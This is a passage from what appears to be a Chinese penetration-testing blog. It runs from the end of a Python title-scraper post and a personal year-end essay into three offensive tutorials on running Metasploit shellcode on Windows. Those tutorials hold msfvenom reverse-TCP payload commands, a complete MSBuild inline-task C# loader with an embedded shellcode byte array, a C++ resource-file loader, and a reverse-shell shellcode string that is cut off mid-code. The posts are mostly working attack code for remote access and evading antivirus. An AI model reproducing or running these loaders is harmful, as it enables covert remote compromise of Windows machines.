title.strip(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">single_thread</span>(<span class="params">url</span>):</span><br><span class="line">    url=url.strip(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    result=<span class="string">&#x27;&quot;&#x27;</span>+url + <span class="string">&#x27;&quot;,&quot;&#x27;</span> + <span class="built_in">str</span>(get_title(url))+<span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.csv&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>,encoding=result_encode_type) <span class="keyword">as</span> output:</span><br><span class="line">        output.write(result+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(argv)!=<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:\n  python3 get-title.py [targetfile]&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    target_file=argv[<span class="number">1</span>]</span><br><span class="line">    signal(SIGINT, handler)</span><br><span class="line">    target=get_urllist(target_file)</span><br><span class="line">    pool = threadpool.ThreadPool(threads)</span><br><span class="line">    threading=threadpool.makeRequests(single_thread,target)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> threading]</span><br><span class="line">    pool.wait()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<ul>
<li>优化了输出方式，改为输出到CSV表格；</li>
<li>修正了爬HTTPS会出现问题的BUG，这么明显的BUG一开始的时候居然没发现……</li>
<li>修正了部分网站爬取时编码问题异常的BUG；</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/" data-id="clllrw16c000898y5dovc9bvg" data-title="一个Get-Title的自我修养" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-2021" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/01/2020-2021/" class="article-date">
  <time class="dt-published" datetime="2021-01-01T06:14:27.000Z" itemprop="datePublished">2021-01-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/01/2020-2021/">2020 - 2021</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>总结一下吧。</p>
<p>2020年是很浑浊的一年，直到昨晚跨年的时候我还是很懵逼，潜意识还完全没意识到2020年就这么过去了。</p>
<p>这一年发生了很多的事情，对我个人而言，对这个世界而言，都是如此。这中间的共同点是，似乎没有什么事情是比较完满的。但这一篇并不是回忆录，所以我也不打算像收拾抽屉一样把它们一件一件堆叠起来。捡一些想说的说吧。</p>
<hr>
<hr>
<p>说起来，当初选择网络安全方向的初衷，其实是希望学习一些黑客技术，以便能够看到屏闭了我的妹子的QQ空间。</p>
<p>这个目标至今没有达成。</p>
<p>而且时过境迁，现在也没有多少人玩QQ了。</p>
<hr>
<p>意识到这个目标成为泡影之后，我想过很多次，为什么要留在这个行业。答案是，因为兴趣。</p>
<p>这是一个仅仅通过技术，就可以获得最原始、最纯粹的成就感的行业。信息安全是一个很广袤的定义，从开锁、到欺骗、到0Day，好像什么东西都能涵盖到信息安全的定义里面，你可以很轻易地在里面找到你感兴趣的东西。而我本人，正如<a href="https://7mitu.github.io/about/">个人描述</a>里说的那样，喜欢每个技能都点一下，传统功夫讲究点到为止（不是）。</p>
<hr>
<p>这一年来其实很苦恼，我目前的技术水平也就算个T，但是周围所有人好像都在谈APT。</p>
<p>饶是我这钛合金脸皮也遭不住天天面部刮痧呀。</p>
<hr>
<p>希望2021年：</p>
<ul>
<li>疫情早日结束</li>
<li>找到自己想要的是什么</li>
<li>钻研技术</li>
<li>远离一些虚伪</li>
<li>找个女朋友</li>
</ul>
<hr>
<p>以上。</p>
<p><img src="/2021/01/01/2020-2021/backiee-114501.jpg" alt="backiee-114501"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2021/01/01/2020-2021/" data-id="clllrw164000198y5ahlp555a" data-title="2020 - 2021" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="w-利用-Net-Framework加载Shellcode" class="h-entry article article-type-w" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/" class="article-date">
  <time class="dt-published" datetime="2020-12-28T05:26:00.000Z" itemprop="datePublished">2020-12-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/">利用.Net Framework加载Shellcode</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="0x00-场景"><a href="#0x00-场景" class="headerlink" title="0x00 场景"></a>0x00 场景</h3><ul>
<li>Windows操作系统</li>
<li>存在.Net Framework环境</li>
<li>无法上传exe等可执行文件</li>
</ul>
<h3 id="0x01-生成载荷"><a href="#0x01-生成载荷" class="headerlink" title="0x01 生成载荷"></a>0x01 生成载荷</h3><p>这里以MSF Meterpreter载荷为例，首先生成Shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=2333 -f csharp</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133105384.png" alt="image-20201228133105384"></p>
<p>制作MSBuild载荷，将生成的Shellcode粘贴在下方代码的<code>shellcode</code>变量中，并保存为文件<code>bad.xml</code>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">ToolsVersion</span>=<span class="string">&quot;4.0&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- This inline task executes shellcode. --&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- Save This File And Execute The Above Command --&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- License: BSD 3-Clause --&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;Hello&quot;</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">ClassExample</span> /&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">UsingTask</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">TaskName</span>=<span class="string">&quot;ClassExample&quot;</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">TaskFactory</span>=<span class="string">&quot;CodeTaskFactory&quot;</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">AssemblyFile</span>=<span class="string">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot;</span> &gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">Task</span>&gt;</span></span><br><span class="line">	    </span><br><span class="line">	      <span class="tag">&lt;<span class="name">Code</span> <span class="attr">Type</span>=<span class="string">&quot;Class&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;cs&quot;</span>&gt;</span></span><br><span class="line">	      &lt;![CDATA[</span><br><span class="line">		using System;</span><br><span class="line">		using System.Runtime.InteropServices;</span><br><span class="line">		using Microsoft.Build.Framework;</span><br><span class="line">		using Microsoft.Build.Utilities;</span><br><span class="line">		public class ClassExample :  Task, ITask</span><br><span class="line">		&#123;         </span><br><span class="line">		  private static UInt32 MEM_COMMIT = 0x1000;          </span><br><span class="line">		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          </span><br><span class="line">		  [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">		  [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">		    private static extern IntPtr CreateThread(            </span><br><span class="line">		    UInt32 lpThreadAttributes,</span><br><span class="line">		    UInt32 dwStackSize,</span><br><span class="line">		    UInt32 lpStartAddress,</span><br><span class="line">		    IntPtr param,</span><br><span class="line">		    UInt32 dwCreationFlags,</span><br><span class="line">		    ref UInt32 lpThreadId           </span><br><span class="line">		    );</span><br><span class="line">		  [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">		    private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">		    IntPtr hHandle,</span><br><span class="line">		    UInt32 dwMilliseconds</span><br><span class="line">		    );          </span><br><span class="line">		  public override bool Execute()</span><br><span class="line">		  &#123;</span><br><span class="line">			//replace with your own shellcode</span><br><span class="line">		    byte[] shellcode = new byte[] &#123; 0x33,0xc9,0x83,0xe9,0xaa,0xe8,0xff,0xff,0xff,0xff,0xc0,0x5e,0x81,0x76,0x0e,0x1c,0xb8,0xf2,0x6e,0x83,0xee,0xfc,0xe2,0xf4,0xe0,0x50,0x70,0x6e,0x1c,0xb8,0x92,0xe7,0xf9,0x89,0x32,0x0a,0x97,0xe8,0xc2,0xe5,0x4e,0xb4,0x79,0x3c,0x08,0x33,0x80,0x46,0x13,0x0f,0xb8,0x48,0x2d,0x47,0x5e,0x52,0x7d,0xc4,0xf0,0x42,0x3c,0x79,0x3d,0x63,0x1d,0x7f,0x10,0x9c,0x4e,0xef,0x79,0x3c,0x0c,0x33,0xb8,0x52,0x97,0xf4,0xe3,0x16,0xff,0xf0,0xf3,0xbf,0x4d,0x33,0xab,0x4e,0x1d,0x6b,0x79,0x27,0x04,0x5b,0xc8,0x27,0x97,0x8c,0x79,0x6f,0xca,0x89,0x0d,0xc2,0xdd,0x77,0xff,0x6f,0xdb,0x80,0x12,0x1b,0xea,0xbb,0x8f,0x96,0x27,0xc5,0xd6,0x1b,0xf8,0xe0,0x79,0x36,0x38,0xb9,0x21,0x08,0x97,0xb4,0xb9,0xe5,0x44,0xa4,0xf3,0xbd,0x97,0xbc,0x79,0x6f,0xcc,0x31,0xb6,0x4a,0x38,0xe3,0xa9,0x0f,0x45,0xe2,0xa3,0x91,0xfc,0xe7,0xad,0x34,0x97,0xaa,0x19,0xe3,0x41,0xd0,0xc1,0x5c,0x1c,0xb8,0x9a,0x19,0x6f,0x8a,0xad,0x3a,0x74,0xf4,0x85,0x48,0x1b,0x31,0x1a,0x91,0xcc,0x00,0x62,0x6f,0x1c,0xb8,0xdb,0xaa,0x48,0xe8,0x9a,0x47,0x9c,0xd3,0xf2,0x91,0xc9,0xd2,0xf8,0x06,0xdc,0x10,0xa4,0xeb,0x74,0xba,0xf2,0x67,0x01,0x31,0x14,0x3e,0x4c,0xe8,0xa2,0x2e,0x4c,0xf8,0xa2,0x06,0xf6,0xb7,0x2d,0x8e,0xe3,0x6d,0x65,0x04,0x0c,0xee,0xa5,0x06,0x85,0x1d,0x86,0x0f,0xe3,0x6d,0x77,0xae,0x68,0xb2,0x0d,0x20,0x14,0xcd,0x1e,0x86,0x7b,0xb8,0xf2,0x6e,0x76,0xb8,0x98,0x6a,0x4a,0xef,0x9a,0x6c,0xc5,0x70,0xad,0x91,0xc9,0x3b,0x0a,0x6e,0x62,0x8e,0x79,0x58,0x76,0xf8,0x9a,0x6e,0x0c,0xb8,0xf2,0x38,0x76,0xb8,0x9a,0x36,0xb8,0xeb,0x17,0x91,0xc9,0x2b,0xa1,0x04,0x1c,0xee,0xa1,0x39,0x74,0xba,0x2b,0xa6,0x43,0x47,0x27,0xed,0xe4,0xb8,0x8f,0x46,0x44,0xd0,0xf2,0x2e,0x1c,0xb8,0x98,0x6e,0x4c,0xd0,0xf9,0x41,0x13,0x88,0x0d,0xbb,0x4b,0xd0,0x87,0x00,0x51,0xd9,0x0d,0xbb,0x42,0xe6,0x0d,0x62,0x38,0xb7,0x77,0x1e,0xe3,0x47,0x0d,0x87,0x87,0x47,0x0d,0x91,0x1d,0x7b,0xdb,0xa8,0x69,0x79,0x31,0xd5,0xec,0x0d,0x50,0x38,0x76,0xb8,0xa1,0x91,0xc9,0xb8,0xf2,0x6e &#125;;</span><br><span class="line">		      </span><br><span class="line">		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">			MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">		      IntPtr hThread = IntPtr.Zero;</span><br><span class="line">		      UInt32 threadId = 0;</span><br><span class="line">		      IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">		      WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">		      return true;</span><br><span class="line">		  &#125; </span><br><span class="line">		&#125;     </span><br><span class="line">	      ]]&gt;</span><br><span class="line">	      <span class="tag">&lt;/<span class="name">Code</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">UsingTask</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-执行载荷"><a href="#0x02-执行载荷" class="headerlink" title="0x02 执行载荷"></a>0x02 执行载荷</h3><p>首先利用MSF的<code>exploit/multi/handler</code>开启监听，然后我们在受控主机上执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319&gt;MSBuild D:/bad.xml</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133814195.png" alt="image-20201228133814195"></p>
<p>回连Shell如下：</p>
<p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133910387.png" alt="image-20201228133910387"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/" data-id="clllrw16e000e98y5ce976cqn" data-title="利用.Net Framework加载Shellcode" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8C%81%E4%B9%85%E5%8C%96/" rel="tag">持久化</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-通过资源文件加载Shellcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/" class="article-date">
  <time class="dt-published" datetime="2020-12-25T05:51:10.000Z" itemprop="datePublished">2020-12-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/">通过资源文件加载Shellcode</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="0x01-生成Shellcode"><a href="#0x01-生成Shellcode" class="headerlink" title="0x01 生成Shellcode"></a>0x01 生成Shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=12345 &gt;payload.bin</span><br></pre></td></tr></table></figure>

<h3 id="0x02-添加资源文件"><a href="#0x02-添加资源文件" class="headerlink" title="0x02 添加资源文件"></a>0x02 添加资源文件</h3><p>右键<code>资源文件&gt;添加&gt;资源</code>添加我们刚刚生成的Shellcode</p>
<p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140005634.png" alt="image-20201225140005634"></p>
<p>选择<code>导入</code>，添加<code>payload.bin</code></p>
<p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140229778.png" alt="image-20201225140229778"></p>
<p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140458518.png" alt="image-20201225140458518"></p>
<p>我们可以在资源文件中看到我们的bin文件已经被加载</p>
<p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225140603313.png" alt="image-20201225140603313"></p>
<p>代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode</span></span><br><span class="line">	<span class="comment">// METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin</span></span><br><span class="line">	HRSRC shellcodeResource = <span class="built_in">FindResource</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCE</span>(IDR_PAYLOAD_BIN1), <span class="string">L&quot;PAYLOAD_BIN&quot;</span>);</span><br><span class="line">	DWORD shellcodeSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, shellcodeResource);</span><br><span class="line">	HGLOBAL shellcodeResouceData = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, shellcodeResource);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, shellcodeResouceData, shellcodeSize);</span><br><span class="line">	((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="0x03-编译和验证"><a href="#0x03-编译和验证" class="headerlink" title="0x03 编译和验证"></a>0x03 编译和验证</h3><p>编译成功没有什么问题</p>
<p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141139791.png" alt="image-20201225141139791"></p>
<p>生成的exe放到虚拟机里运行一下，成功</p>
<p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141256996.png" alt="image-20201225141256996"></p>
<p>免杀率……将就吧，毕竟并没有做什么免杀的措施，只是一种加载shellcode的技巧而已</p>
<p><img src="/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/image-20201225141643919.png" alt="image-20201225141643919"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/" data-id="clllrw16k000w98y58ta8fnh4" data-title="通过资源文件加载Shellcode" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag">后渗透</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-避开Windows-API执行Shellcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/" class="article-date">
  <time class="dt-published" datetime="2020-11-25T05:22:39.000Z" itemprop="datePublished">2020-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/">避开Windows API执行Shellcode</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;.text&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// msvenom -p windows/x64/shell_reverse_tcp lhost=X lport=Y -f c</span></span><br><span class="line">__declspec(<span class="built_in">allocate</span>(<span class="string">&quot;.text&quot;</span>)) <span class="type">char</span> goodcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;</span></span><br><span class="line"><span class="string">&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&quot;</span></span><br><span class="line"><span class="string">&quot;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&quot;</span></span><br><span class="line"><span 